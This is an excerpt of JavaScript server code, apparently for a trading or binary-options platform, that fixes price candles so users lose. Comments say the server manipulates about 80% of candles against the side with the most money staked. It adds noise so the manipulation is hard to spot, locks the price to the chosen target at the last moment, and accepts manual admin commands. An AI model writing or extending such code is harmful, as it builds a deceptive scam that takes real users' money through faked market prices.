...
// 0.80 means 80% of the time, the server will manipulate the candle to make users lose.
...
db.ref('admin/markets').on('value', (snapshot) => {
    ...
    Object.keys(fbMarkets).forEach(marketKey => {
        ...
        // Store active trades for the Auto-Pilot to calculate volume
...
// 2. Exact Pattern Generator (For Manual Command & Smart Auto-Pilot)
...
// 🔥 CORE LOGIC: Determines what the next candle will be
function ensureCurrentPeriodCandle(marketData, currentPeriod) {
    ...
    if (currentPeriod > lastCandle.timestamp) {
        ...
        // 1. Highest Priority: Manual Admin Command from HTML Panel
        if (marketData.nextCandleCommand) {
            ...
            marketData.nextCandleCommand = null; // Reset after use
        } 
        
        // 2. Second Priority: Smart Auto-Pilot (Forces User Loss based on Volume)
        if (!newCandle) {
            ...
            // If there is money on the table, manipulate the result
            if (upVol > 0 || downVol > 0) {
                if (Math.random() < ADMIN_WIN_RATIO) {
                    // Admin wins: Go against the highest volume
                    ...
                    // Add slight noise so it doesn't look exactly the same every time
                    newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
                    console.log(`[AUTO-PILOT] ${marketData.marketId} -> Users UP: $${upVol}, DOWN: $${downVol}. Forcing ${targetDirection} to secure profit.`);
                }
            }
        }
        
        // 3. Third Priority: Natural Market Movement (If no command and no active trades)
        if (!newCandle) {
...
// Tick Engine: Moves the price smoothly towards the Target Close
function updateRealisticPrice(marketData, candle, currentPeriod) {
    ...
    if (candle.isPredetermined) {
        ...
        // LOCK the price exactly to the target in the last 1.5 seconds!
